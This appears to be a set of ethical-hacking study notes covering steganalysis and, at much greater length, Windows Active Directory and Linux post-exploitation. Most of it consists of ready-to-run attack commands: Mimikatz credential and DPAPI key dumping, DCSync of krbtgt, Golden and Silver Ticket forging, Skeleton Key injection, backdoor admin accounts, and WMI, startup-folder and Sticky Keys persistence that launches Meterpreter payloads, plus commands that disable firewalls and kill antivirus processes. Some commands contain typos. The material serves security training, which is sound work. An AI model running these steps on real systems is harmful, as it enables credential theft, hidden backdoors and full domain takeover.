Spam/email steganography refers to the technique of sending secret messages by embedding them and hiding the embedded data in spam emails. Various military agencies supposedly use this technique with the help of steganography algorithms. You can use the Spam Mimic tool to hide a secret message in an email.

### Spam/Email Steganography Tool
- **Spam Mimic** [https://www.spammimic.com]

### Other Types of Steganography 
- **Web Steganography:** In web steganography, a user hides web objects behind other objects and uploads them to a web server.
- **Natural Text Steganography:** Natural text steganography is the process of converting sensitive information into user-definable free speech such as a play.
- **Hidden OS Steganography:** Hidden OS steganography is the process of hiding one OS in another.
- **C++ Source-Code Steganography:** In C++ source-code steganography, the user hides a set of tools in the files.
- **Compressed Data Steganography**: Conceals data inside compressed files without changing size much.

---
### Steganalysis 
Steganalysis is the process of detecting hidden data in files like images, audio, video, or text. It works **opposite to steganography**. A **steganalyst** looks for unusual patterns, large file sizes, or changes in bit structure to spot hidden messages.

There are **two key steps**:
1. **Detection** – Finding if secret data exists.
2. **Distortion** – Breaking or removing that hidden data.

Types of attacks include:
* **Message Attack**: Analyzing known hidden messages.
* **Chosen-Message Attack**: Hiding data yourself to study its patterns.

By comparing **original (cover)** and **modified (stego)** files, analysts detect clues. Once found, they can **delete or change** the hidden data.

In short, steganalysis helps uncover secret communication by analyzing and exposing hidden content.

Some challenges of steganalysis are as follows:
* 🔸 **Uncertainty**: It's hard to know if a file even contains hidden data or not.
* 🔸 **Detection Difficulty**: Finding hidden messages in images or media is not easy or always accurate.
* 🔸 **Encrypted Messages**: The secret data might be encrypted before hiding, making analysis harder.
* 🔸 **Irrelevant Noise**: Files may contain random data or noise, which confuses detection tools.

---
### Steganalysis Methods/Attacks on Steganography 
Steganography attacks work according to the type of information available for the steganalyst to perform steganalysis on. This information may include a hidden message, carrier (cover) medium, stego-object, steganography tools, or algorithms used for hiding information. Thus, the classification of steganalysis includes the following types of attacks: stego-only, known-stego, known-message, known-cover, chosen-message, chosen-stego, chi-square, distinguishing statistical, and blind classifier.

* **Stego-only attack**: Only the stego-object (file with hidden data) is available. The attacker tries every possible method to extract hidden info.

* **Known-stego attack**: The attacker knows the original file, stego-file, and the steganography method. Easy to detect hidden data.

* **Known-message attack**: The secret message and stego-file are known. Helps understand how the message was hidden.

* **Known-cover attack**: Both original file and stego-file are known. The attacker compares them to spot hidden changes.

* **Chosen-message attack**: A message is chosen and hidden intentionally to see how it affects the file, helping reveal the stego technique.

* **Chosen-stego attack**: The attacker knows the stego-file and the tool or method used. Makes it easier to reverse the hiding process.

* **Chi-square attack**:  Uses math (probability test) to check if a file has hidden data by comparing it to normal data.

* **Distinguishing statistical attack**: Analyzes statistical patterns in the file to detect changes caused by hidden messages.

* **Blind classifier attack**: Uses machine learning to detect hidden data by training a model on original files and spotting differences.

### Detecting Steganography (Text, Image, Audio, and Video Files)
* **📝 Text Files**: Look for **extra spaces**, **strange patterns**, or **invisible characters** (like tabs or white spaces). A basic text editor can help spot these clues.

* **🖼️ Image Files**: Check for **image distortions**, **file size changes**, or **weird colors/pixels**. Use **statistical analysis** to examine **LSB patterns** for hidden data.

* **🎵 Audio Files**: Use **frequency analysis** and **LSB scanning** to find **unusual patterns** or **noises**. Look into inaudible parts for hidden content.

* **🎥 Video Files**: Combine image and audio detection methods. Watch for **odd visuals, gestures**, or **unusual sound patterns**.

> 💡 **Note**: Audio and video steganography are harder to detect, but careful technical analysis improves your chances.

### Steganography Detection Tools 
Steganography detection tools allow you to detect and recover hidden information in any digital media, such as images, audio, and video.

- **zsteg** [https://github.com/zed-0xff/zsteg]
- **StegoVeritas** [https://github.com/bannsec/stegoVeritas]
- **Stegextract** [https://github.com/evyatarmeged/stegextract]
- **StegoHuntTM MP** [https://www.wetstonetech.com]
- **Steganography Studio** [https://stegstudio.sourceforge.net]
- **Virtual Steganographic Laboratory (VSL)** [https://vsl.sourceforge.net]

----
## Establishing Persistence
**Persistence** means attackers make sure their malware stays active on a system, even after reboots. They trick users into running infected files, then secretly create a backdoor so they can come back anytime, stay hidden, and keep controlling or damaging the system.

---
### Maintaining Persistence Using Windows Sticky Keys 
Sticky Keys is a legitimate Windows accessibility feature that helps users press key combinations (like Ctrl+Alt+Del) one key at a time. It activates when you press the Shift key five times.

However, attackers can exploit this feature to gain SYSTEM-level access (the highest privilege) even after a system reboot.

Here’s a **simple yet detailed explanation** of how attackers use the **Windows Sticky Keys feature to maintain persistence**:

#### 🔓 **How the Attack Works (Step-by-Step)**

1. **Initial Access**:
   The attacker first **gains remote access** to a Windows machine.

2. **Privilege Escalation**:
   They use a **BypassUAC exploit** (like in Metasploit) to become an **Administrator** or **SYSTEM** user.

3. **Enable Persistence with Metasploit**:
   Using the **Metasploit `sticky_keys` module**, the attacker **replaces the Sticky Keys program (`sethc.exe`)** with **`cmd.exe`** (Command Prompt) — but keeps the file name `sethc.exe`.

4. **What This Does**:
   When someone **presses the Shift key 5 times on the login screen**, instead of opening the Sticky Keys dialog, it **launches Command Prompt with SYSTEM privileges** — **without logging in**!

5. **Persistence Achieved**:
   Even after the system reboots, the attacker can **physically or remotely trigger Shift x5** and get full access again via CMD.

---
### Maintaining Persistence by Abusing Boot or Logon Autostart Executions 
Attackers can make their malicious programs run automatically when the system starts or a user logs in. They do this by abusing boot or logon settings, like placing files in special folders or modifying Windows Registry. This helps them **stay hidden**, **run their tools automatically**, and sometimes **gain higher privileges** on the system each time it starts.

![image](https://github.com/user-attachments/assets/c2e009ae-1751-40c4-b25d-39f339711197)

#### 🔓 Step-by-Step: Abusing Boot/Logon Autostart Executions
```powershell
# 1. Abuse Registry Run Keys for Autostart Execution
# Attackers target registry keys that auto-run on login.
# If a service linked here has weak permissions, attackers can modify it.

# 2. Use WinPEAS to Enumerate Permissions for Exploitable Services
winPEASx64.exe quiet applicationinfo
# 🔍 This scans for misconfigurations and lists permission issues with services.

# 3. Inject Payloads via Startup Folder (Programs auto-run on login)
# First, check who has permission to modify the startup folder.

icacls "C:\ProgramData\Microsoft\Windows\StartMenu\Programs\Startup"
# 📋 Lists access control permissions. If attacker has write access, it's exploitable.

# 4. Use AccessChk to Check Effective Permissions
accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# ✅ Confirms which users/groups can modify or add programs in startup folder.

# ✅ If vulnerable, attacker drops a malicious executable (e.g., RAT) here.
# It auto-runs every time the user logs in — ensuring persistence.
```
Attackers look for weak permissions in Registry or Startup folders. If found, they inject malicious apps to auto-run on boot or login, allowing them to stay hidden or gain higher privileges easily.

---
### Domain Dominance Through Different Paths
Domain dominance is when an attacker gains full control over a network by targeting and compromising critical systems like Domain Controllers (DCs). This usually begins by using social engineering to trick a legitimate user, gaining access to their system. From there, attackers send remote code execution commands to move deeper into the network. Once inside, they use advanced techniques like Golden/Silver Tickets, DPAPI abuse, or Skeleton Key backdoors to maintain long-term control. The main goal is to take over domain admin accounts, allowing the attacker to access sensitive data, install malware, and control services while staying hidden and persistent in the network.

---
### Remote Code Execution
Attackers attempt to execute malicious code on the target domain controller (DC) through CLI to launch a domain dominance attack. Using this technique, attackers hold persistence to perform malicious activities over time without being detected. Attackers follow the steps below to perform a domain dominance attack via remote code execution. 

```powershell
# Step 1: Create a fake user on the Domain Controller using WMI
wmic /node:<DomaincontrollerName> process call create "net user /add PiratedProcess Du^^Y01"
# Description: This command adds a new user named 'PiratedProcess' with password 'Du^^Y01' on the target Domain Controller.

# Step 2: Add the new user to the 'Admins' group using PsExec
PsExec.exe \\<DomaincontrollerName> -accepteula net localgroup "Admins" PiratedProcess /add
# Description: This adds 'PiratedProcess' to the Admins group, giving it administrative privileges on the domain.

# Step 3: Manually verify the user from Active Directory Users and Computers (ADUC)
# Description: Go to ADUC, find 'PiratedProcess', and check its group under the "Member of" tab to confirm admin access.

# Result: The attacker now has a backdoor admin account (PiratedProcess) to stay hidden and maintain control over the Domain Controller.
```

----
### Abusing Data Protection API (DPAPI)
DPAPI is a unified location in Windows environments where all the cryptographically secured files, passwords of browsers, and other critical data are stored. Windows domain controllers (DCs) contain a master key to decrypt DPAPI-protected files. Attackers often attempt to obtain this master key from the DC using any of the following methods:
```powershell
# STEP 1: Recover a specific master key using the user's password
> mimikatz
mimikatz # dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:YourPassword /protected
# → Decrypts a specific DPAPI-protected file using the known SID and user password.

# STEP 2: Dump all local DPAPI master keys using admin privileges
mimikatz # sekurlsa::dpapi
# → Lists all DPAPI master keys from local memory, useful if the attacker has SYSTEM/admin rights.

# STEP 3: Dump backup master keys from the Domain Controller (DC)
mimikatz # lsadump::backupkeys /system:dc01.offense.local /export
# → Exports DPAPI backup keys from the DC to decrypt roaming profiles and protected data remotely.

# STEP 4: Verify extracted keys
> cd path\to\mimikatz\output
> dir *.der *.key *.pvk *.pfx
# → Check if keys (.der, .pfx, .pvk) are successfully extracted. These can decrypt protected data across the network.
```
![image](https://github.com/user-attachments/assets/6f0c614e-218d-4125-a776-99d79f23df8d)
![image](https://github.com/user-attachments/assets/e24a9dc5-c33c-4ff6-8592-67a5d1ffe45a)

---
### Malicious Replication
Malicious replication enables attackers to create an exact copy of user data using the admin credentials. This technique allows attackers to compromise other credentials and access accounts from a remote location. Attackers follow all the DCSync attack steps to replicate sensitive accounts such as “krbtgt,” which serves as a master key for signing Kerberos tickets. 
```powershell
# Step 1: Load Mimikatz PowerShell module
PS> Import-Module .\Invoke-Mimikatz.ps1

# Step 2: Use DCSync to simulate Domain Controller replication
PS> Invoke-Mimikatz -Command '"lsadump::dcsync /domain:target.local /user:krbtgt"'

# Output:
[DC] 'target.local' will be accessed
[DC] Trying to get user info for 'krbtgt'
[DC] Found user account
[NTLM HASH] = aad3b435b51404eeaad3b435b51404ee:5d41402abc4b2a76b9719d911017c592
```
![image](https://github.com/user-attachments/assets/5a94258e-ef3e-4327-9bad-eda906e3a775)

In this attack, the hacker uses Invoke-Mimikatz to imitate a Domain Controller and request user data replication (just like DCs do). The command targets the krbtgt account, which is critical for Kerberos ticket signing. Once executed, it reveals NTLM password hashes, which can be used to forge Golden Tickets or impersonate users remotely—without touching the actual Domain Controller files.

---
### Skeleton Key Attack
A Skeleton Key attack is a stealthy method where attackers, after gaining domain admin rights and access to a domain controller, inject a special malware into its memory. This malware creates a master backdoor password that works for all domain accounts, allowing the attacker to log in as any user without changing their actual password. Since it mimics normal authentication, it becomes extremely hard to detect, making it a powerful technique for maintaining hidden access within a network.

#### Working of the Skeleton Key Attack 
```powershell
# Step 1: Gain privilege access (debug level) to manipulate LSASS
Invoke-Mimikatz -Command '"privilege::debug"'

# Step 2: Inject the Skeleton Key into LSASS on the Domain Controller
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' - <Target_DC_Name>

# Description:
# This injects a master password ("mimikatz") that works for any domain account without changing their real password.
# If LSASS is already patched, an error will show.
```
![image](https://github.com/user-attachments/assets/5067030e-1d80-4bff-9cc3-365bfc321724)

```powershell
# Step 3 (Alternative): Use Empire's module to automate and run in-memory
usemodule powershell/persistence/misc/skeleton_key
```
![image](https://github.com/user-attachments/assets/a0f52be3-0a66-4b74-825b-69ea46e6f847)

```powershell
# Step 4: Execute the module to patch LSASS automatically
execute

# Description:
# Empire runs Mimikatz in memory, avoids writing files to disk, and patches LSASS to inject the Skeleton Key stealthily.
```
![image](https://github.com/user-attachments/assets/b416c553-8fab-4298-a9ee-46f07ab9f25a)

---
### Golden Ticket Attack
A Golden Ticket attack is a powerful post-exploitation method where an attacker gains full control over an Active Directory (AD) environment by forging Kerberos Ticket Granting Tickets (TGTs). To do this, the attacker first compromises the **KRBTGT account**, which is responsible for signing these tickets. Once they have the KRBTGT hash, they can create fake TGTs and impersonate any user, including domain admins. This gives them unrestricted access to resources and long-term persistence within the domain, all without needing to authenticate again through normal means.

![image](https://github.com/user-attachments/assets/4cbdf493-548b-43b7-9554-c9f8879d46cb)

#### Working of a Golden Ticket Attack
Attackers steal the KRBTGT account hash from the domain controller, then use it to create a fake admin ticket that lets them log in anywhere across the domain—without needing real credentials. This is one of the most powerful ways to dominate a Windows network.
```powershell
# Step 1: Identify Domain Info (Domain Name + SID)
whoami /user
# → Shows current domain user info including SID, used later for the golden ticket.

# Step 2: Steal KRBTGT Hash Using DCSync via Mimikatz
mimikatz # lsadump::dcsync /domain:example.com /user:krbtgt
# → Extracts the NTLM hash of the KRBTGT account using replication privileges.

# Step 3: Forge Golden Ticket Using Extracted Hash
mimikatz # kerberos::golden /domain:example.com /sid:S-1-5-21-XXXXXXXXXX /rc4:<KRBTGT_hash> /id:500 /user:Administrator
# → Generates a forged Kerberos ticket (Golden Ticket) allowing full domain access.

# Step 4: Maintain Persistence
# → Ticket validity can be set manually to last 10 years or more.
# → This keeps access persistent even after reboots or password changes.
```
![image](https://github.com/user-attachments/assets/c57f2be2-86ef-4025-a696-3d0d7c17ab90)
![image](https://github.com/user-attachments/assets/bfc6dbb7-8c4e-4699-9366-1ad8f24be74a)

---
### Silver Ticket Attack
A Silver Ticket attack is a method used by attackers after gaining access to a local service account's credentials. Using these, they create a fake Kerberos TGS (Ticket Granting Service) ticket for a specific service without needing to contact the domain controller. This makes the attack stealthy and harder to detect. Unlike a Golden Ticket, which gives control over the whole Active Directory, a Silver Ticket only gives access to one targeted service—making it a focused but powerful method for unauthorized access.

![image](https://github.com/user-attachments/assets/c1bd080e-3113-408f-94ea-279eeae3914a)

#### Working of a Silver Ticket Attack
```powershell
# Step 1: Attacker gains initial access (via phishing, vulnerability, etc.)
# ➤ No command here; access is gained via initial compromise.

# Step 2: Gather Domain Information (Domain Name & SID)
whoami /user
# ➤ Displays the user SID and domain info (needed to forge tickets).

# Step 3: Identify target service (like MSSQLSvc, HTTP, etc.)
# ➤ Manually check running services or use enum tools to get SPN.

# Step 4: Extract NTLM Hash of the target service account
mimikatz
privilege::debug
lsadump::lsa /patch
# ➤ Extract NTLM hash of the service account using Mimikatz.

# Step 5: Perform Kerberoasting (optional) to crack service ticket offline
# ➤ Tools like Rubeus or GetUserSPNs.py from Impacket
GetUserSPNs.py -request -dc-ip <DC-IP> domain/user:pass
# ➤ Dumps service tickets to be cracked with hashcat or John

# Step 6: Create forged Silver Ticket using mimikatz
kerberos::golden /user:<target_service_user> /domain:<domain.local> /sid:<domain_SID> /rc4:<NTLM_hash> /service:<service_name> /target:<FQDN> /ticket:<ticket.kirbi>
# ➤ This forges the service ticket (TGS) for the target service.

# Step 7: Inject and use the forged Silver Ticket
kerberos::ptt ticket.kirbi
# ➤ Pass-the-ticket (PTT) into memory to impersonate the service user.

# Step 8: Exploit service with elevated permissions
# ➤ You can now access the target service as a legitimate user.

# Step 9: If you escalate to admin, dump AD hashes
privilege::debug
sekurlsa::logonpasswords
# ➤ Dumps credentials and NTLM hashes of AD accounts from memory.
```
![image](https://github.com/user-attachments/assets/2d039108-639b-4261-b976-83b895855e28)

---
### Maintain Domain Persistence Through AdminSDHolder
AdminSDHolder is a special Active Directory object that protects high-privilege accounts by applying strict security settings. The SDProp process checks these settings every hour and resets any changes to match the AdminSDHolder's permissions. Attackers with domain admin rights can abuse this by adding their own user account to the AdminSDHolder's ACL and assigning “GenericAll” rights. This gives them full control, just like a domain admin. Since SDProp automatically re-applies these permissions every hour, the attacker’s access remains persistent even if someone tries to remove it.

#### Establishing Domain Persistence by Abusing AdminSDHolder 
```powershell
# Step 1: Assign full rights (GenericAll) to user 'Martin' on the AdminSDHolder ACL
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
```
![image](https://github.com/user-attachments/assets/cfb254c1-6b07-483c-8c64-ab8a02fd4211)

```powershell
# Step 2: Verify if user 'Martin' now has full (GenericAll) permissions
Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs
```
![image](https://github.com/user-attachments/assets/c31f8be2-5d1b-4fd5-a809-c1b744c791ff)

```powershell
# Step 3: Change the SDProp check frequency to 3 minutes (default is 60 mins)
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
```
![image](https://github.com/user-attachments/assets/f522a93a-cbb5-4088-9405-c68bd6f05b4b)

The screenshot shows that the Martin account has been added to AdminSDHolder with all permissions set.
![image](https://github.com/user-attachments/assets/f1a2b928-3116-48da-ab08-686e2b921fd4)

```powershell
# Step 4: Add 'Martin' to the Domain Admins group (gives full domain privileges)
net group "Domain Admins" Martin /add /domain
```
![image](https://github.com/user-attachments/assets/99de26b4-2678-4498-802e-88440e9eaf6d)

```powershell
# Step 5: Test domain controller access (replace 10.10.1.22 with DC IP)
dir \\10.10.1.22\c$
```
![image](https://github.com/user-attachments/assets/97dfabf1-1df7-491a-8cbf-6c33f0c20ae7)

---
### Maintaining Persistence Through WMI Event Subscription
WMI Event Subscription is a technique attackers use to stay hidden and maintain access on a target system. By setting up event triggers in Windows Management Instrumentation, attackers can make malicious code run automatically when specific system events happen—like a reboot or a login. This lets them quietly execute payloads and keep persistence, even after the system restarts. Scripts are often used to automate and hide these actions, making it hard to detect.

#### Techniques to Maintain Persistence Using WMI Event Subscription 

---
##### Using Command Prompt 
```powershell
# Step 1: Define the WMI event filter (triggers every 60 seconds based on system performance changes)
eSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# Step 2: Create a WMI Event Consumer that defines what to run when the event is triggered
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="EthicalHacker", ExecutablePath="C:\Windows\System32\ethicalhacker.exe", CommandLineTemplate="C:\Windows\System32\ethicalhacker.exe"

# Step 3: Link the filter (event trigger) and the consumer (malicious payload)
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"EthicalHacker\"", Consumer="CommandLineEventConsumer.Name=\"EthicalHacker\""
```
![image](https://github.com/user-attachments/assets/5a72295f-5223-4371-a505-cae5c00f6601)

The malicious payload is automatically executed within 60 s after every restart of the system and creates a Meterpreter session with the attacker.

![image](https://github.com/user-attachments/assets/76dade6e-2982-47d7-b004-9a706683c087)

---
##### Using Wmi-Persistence
Attackers also use `Wmi-Persistence`, a PowerShell script, to perform WMI event subscriptions and acquire persistence. It triggers various actions such as Startup, Logon, Interval, and Timed and allows attackers execute various functions such as the installation, review, and removal of the WMI events.
```powershell
# Step 1: Launch PowerShell as Administrator
PS C:\> powershell

# Step 2: Use the Wmi-Persistence script to install a malicious payload
PS C:\> Install-Persistence -Trigger Startup -Payload "C:\Windows\System32\ethicalhacker.exe"

# Description:
# - Install-Persistence → Executes the WMI event subscription.
# - -Trigger Startup → Sets the trigger to activate on system startup.
# - -Payload → The malicious EXE to run (could be a Meterpreter reverse shell or custom payload).
```
![image](https://github.com/user-attachments/assets/ddc71111-b2ba-41f3-a085-ec4c993da540)

The above command includes a trigger Startup that executes the specified payload within 5 min after system reboot and establishes a Meterpreter session with the attacker.

![image](https://github.com/user-attachments/assets/8382735a-1d24-41ae-8cd9-e22c5e7e9545)
![image](https://github.com/user-attachments/assets/25aedbb7-2c86-4418-841b-bfe46f0be94c)

---
##### Using PowerLurk
🔗Source [https://github.com/Sw4mpf0x/PowerLurk]

PowerLurk is a PowerShell-based tool designed to help attackers or red teamers create malicious WMI event subscriptions in Windows. By abusing WMI (Windows Management Instrumentation), PowerLurk can trigger payloads automatically during specific system events like user logon, USB insertion, process start, or time-based triggers. This makes it useful for maintaining stealthy persistence on a compromised system, especially since these WMI triggers are hard to detect and don't require files to run.

```powershell
# Step 1: Import the PowerLurk script to use its functions
Import-Module .\PowerLurk.ps1
# (Loads the PowerLurk module containing WMI persistence tools)

# Step 2: List all active WMI event subscriptions on the system
Get-WmiEvent
# (Displays existing WMI event consumers, filters, and bindings)

# Step 3: Register a malicious WMI event to persistently run a payload at user logon
Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand "ethicalhacker.exe" -Trigger UserLogon -Username any
# (Creates a hidden WMI event that launches the payload "ethicalhacker.exe" whenever any user logs in)
```
![image](https://github.com/user-attachments/assets/c467934c-2e13-41a7-8f31-73fe913b08fc)

---
### Overpass-the-Hash Attack 
The Overpass-the-Hash (OPtH) attack is a post-exploitation technique where an attacker, after gaining access to a user's NTLM hash or AES key, uses it to request a Kerberos Ticket Granting Ticket (TGT) without needing the actual password. This lets the attacker impersonate the user and access network resources the user is allowed to use. The hash is typically extracted from the LSASS memory on a compromised system or domain controller. Since the hash stays valid until the user changes their password, the attacker can maintain access and move laterally across the network using this technique.
```powershell
# Step 1: Gain debug privilege to access sensitive memory areas
mimikatz # privilege::debug  
# → Enables higher privileges required to dump credentials from LSASS.

# Step 2: Extract Kerberos encryption keys (AES128, AES256, NTLM) from memory
mimikatz # sekurlsa::ekeys  
# → Dumps encryption keys like NTLM (RC4), AES128, AES256 used by Kerberos.

# Step 3: Use these keys to create a forged TGT (Ticket Granting Ticket) and perform Overpass-the-Hash
# (Actual OPtH requires additional mimikatz modules like kerberos::ptt and kerberos::golden)

# Result: You can now impersonate the user and access authorized resources without the password, using only the key.
```
![image](https://github.com/user-attachments/assets/d7fb5dd5-ec68-4338-8a85-5256046e8d3c)

---
## 🐧Linux Post-Exploitation
After compromising and gaining shell access to a target system, attackers attempt to perform further exploitation to gain complete access over other resources and achieve long-term persistence.

Listed below are some Linux-based post-exploitation commands.

### File-System Commands
| Commands | Description |
|---|---|
| `find / -perm -3000 -ls 2>/dev/null` | Discovers SUID-executable binaries |
| `find / -path /sys -prune -o -path /proc -prune -o -type f -prem -o=w -ls 2>/dev/null` | Discovers world-writable files |
| `chmod o-w file` | Disables write access to a file |
| `find / -path /sys -prune -o -path /proc -prune -o -type d -prem -o=w -ls 2>/dev/null` | Discovers world-writable directories |
| `find / -name "*.txt" -ls 2>/dev/null` | Discovers .txt files on the system |
| `sudo -l` | Displys the list of permitted and forbidden commands |
| `openssl s_client -connect <hostname>:<port> -showcerts` | Displays all certificates' details |
| `keytool -list -v -keystore keystore.jks` | Displays contents of keystore file and alias names |

### Information-Gathering Commands
| Commands | Description |
|---|---|
| `ps -ef` | Displays the current process along with its process ID (PID) |
| `mount` | Attaches a file system to the directory tree structure |
| `route -n` | Displays host/network names in numeric form |
| `/sbin/ifconfig -a` | Displays network configuration details |
| `cat /etc/crontab` | Displays running cron jobs |
| `ls -la /etc/cron.d` | Displays the software package used for the specified cron job |
| `cat /etc/export` | Displays directories that can be exported to NFS clients |
| `cat /etc/redhat*`, `cat /etc/debian*`, `cat /etc/*release` | Displays the OS version details |
| `ls /etc/rc*` | Lists bootup services |
| `egrep -e '/bin/(ba)?sh' /etc/passwd` | Displays all the users who have shell acess |
| `cat ~/.ssh/` | Displays SSH relationships and login details |

----
## 🪟Windows Post-Exploitation 
Once attackers compromise a system and gain shell access to it, they can perform various undesirable activities without the user’s knowledge. The main intention behind performing post-exploitation is to gain control over every part of the system and maintain persistence over time. 

Listed below are some Windows-based post-exploitation commands.

### File-System Commands
| Commands | Description |
|---|---|
| `dir /a:h` | Retrieves the directory names with hidden attributes |
| `findstr /E ".txt" > txt.txt` | Retrieves all the text files |
| `findstr /E ".log" > log.txt` | Retrieves all the log files |
| `findstr /E ".doc" > doc.txt` | Retrieves all the document files |

### Hash Computing Commands
| Commands | Description |
|---|---|
| `Get-FileHash <filename> -a md5` | Generates MD5 hashes |
| `Get-FileHash <filename> -a sha1` | Generates SHA-1 hashes |
| `Get-FileHash <filename>` | Retrieves SHA-256 hashes by default |

### Registry Commands
| Commands | Description |
|---|---|
| `reg query HKEY_LOCAL_MECHINE /f credential /t REG_SZ /s hklm_password.txt` | Detects the registry hives for the value "credential" |
| `reg query HKEY_LOCAL_MACHINE\SOFWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated > reg_always.txt` | Checks whether any package is installed with elevated privilages. If values is "1", the installer uses elevated privilages for installing application |
| `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall >> ListofInstalledProgeams.txt` | Provides a list of all programs to query a registry |

### Scheduler Commands
| Commands | Description |
|---|---|
| `schtasks /query /fo LIST /v > schtasks.txt` | Retrieves the sheduled task list |
| `tasklist /SVC > tasklist.txt` | Retrieves all currently active processes |

### WMIC Commands
| Commands | Description |
|---|---|
| `wmic os where Primary='TRUE' reboot` | Reboot Windows |
| `wmic service get name,displayname,pathname,startmode > wmic_service.txt` | Retrieves the service name path of the executable, etc. |
| `wmic /node:"" product get name,version,vendor` | Displays the details of the installed software |
| `wmic cpu get` | Retrieves the processor's details |
| `wmic useraccount get name,sid` | Retrieves login names and their SIDs |

### Net Commands
| Commands | Description |
|---|---|
| `net config rdr` | Shows domain connection details |
| `net computer \\computername/add` | Adds a computer to the domain |
| `net view` | Displays the list of computers and networks devices in the domain |
| `net view \\host` | Displays the name of the host computer |
| `net share` | Helps manage shared resources with the appropriate prameters |

### Network Commands
| Commands | Description |
|---|---|
| `route print` or `netstat -r` | Displays routing tables for the destination |
| `arp -a` | Shows the ARP table for a specific IP address |
| `ipconfig /all` | Displays IP configuaration details |
| `getmac` | Retrieves the Physical address (MAC Address) |

### Service Commands
| Commands | Description |
|---|---|
| `sc queryx type=service state=all` | Lists all the available services |
| `sc queryx type=service state=all \| find /i "Name of the service: myService"` | Lists details about the specified service |
| `net start` & `net stop` | Start & Stop a network service |
| `netsh firewall show state` | Displays the current firewall state |
| `netsh firewall show config` | Displays firewall settings |
| `netsh advfirewall set currentprofiles state off` | Turns off the firewall service for the current profile |
| `netsh advfirewall set allprofiles state off` | Turns off the firewall service for all profiles |

### Remote Execution Commands
| Commands | Description |
|---|---|
| `wmic /node:<IP> /user:administator /password:$PASSWORD bios get serialnumber` | Retrieves the PC's serial number |
| `taskkill.exe /S <IP> /U domain\username /F /FI "eset"` | Terminates services associated with eset |
| `tasklist.exe /S <IP> /U domain\username` | Defines the user context to execute commands |
| `tasklist.exe /S <IP> /U domain\username /FI "USERNAME eq NT AUTHORITY\SYSTEM" /FI "STATUS eq running"` | Retrieves all the processes running on the system that are not actually "SYSTEM" |

### Sysinternals Commands
| Commands | Description |
|---|---|
| `psexec -i \\<RemoteSystem> cmd` | Establishes an interactive CMD with a remote system |
| `psexec -i \\<RemoteSystem> -c file.exe` | Copies file.exe from the local machine to a remote computer |
| `psexec -i -d -s c:\windows\regedit.exe` | Retrieves the contents of security keys and SAM |
| `osexec -i \\<RemoteSystem> ipconfig /all`  | Displays a remote system's network information |

### Authenticated WMI Exec via PowerShell (Metasploit Module)
| Commands | Description |
|---|---|
| `msf > use exploit/windows/local/ps_wmi_exec` | Launches a suitable local exploit |
| `msf exploit(windows/local/ps_wmi_exec) > show target` | Displays the list of targets |
| `msf exploit(windows/local/ps_wmi_exec) > show options` | Displays all the available options |
| `msf exploit(windows/local/ps_wmi_exec) > show payloads` | Displays possible payloads |
| `msf exploit(windows/local/ps_wmi_exec) > show evasion` | Displays suitable evasion options |
